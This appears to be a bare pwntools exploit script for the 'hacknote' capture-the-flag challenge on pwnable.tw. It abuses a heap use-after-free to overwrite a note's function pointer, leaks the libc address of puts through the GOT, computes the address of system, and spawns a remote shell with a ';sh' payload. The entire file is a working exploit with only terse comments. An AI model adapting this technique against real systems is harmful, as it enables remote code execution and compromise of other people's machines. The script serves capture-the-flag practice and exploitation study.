from pwn import *
import time

context.update(os='linux', arch='i386')
# io = process("./hacknote")
io = remote("chall.pwnable.tw", 10102)


puts_offset = 0x0005f140
system_offset = 0x0003a940

idx = -1

def addNote(size, val):
	global idx
	io.sendlineafter("Your choice :", "1")
	io.sendlineafter("Note size :", str(size))
	if size:
		io.sendafter("Content :", val)
	idx += 1
	return idx
def deleteNote(idx):
	io.sendlineafter("Your choice :", "2")
	io.sendlineafter("Index :", str(idx))
def printNote(idx):
	io.sendlineafter("Your choice :", "3")
	io.sendlineafter("Index :", str(idx))
	return io.recvline()[:4]


addNote(0x100, "A"*8)
addNote(0x100, "B"*8)
i = addNote(0x100, "C"*8)

deleteNote(2)
deleteNote(0)

# head -> a -> c
# how to print puts plt.got entry ?

addNote(0x8, p32(0x0804862B) + p32(0x0804A024)) # (a, c) vs c modified

puts = unpack_many(printNote(i), "all")[0]
system = puts + system_offset - puts_offset
print "puts_got = {}".format(hex(puts))
print "system_got = {}".format(hex(system))


deleteNote(0)
deleteNote(1)
# head -> b -> a
# how to overwrite puts => system ?
addNote(0x8, p32(system) + ';sh\x00') # (b, a) vs a modified

# printNote(0)
io.interactive()
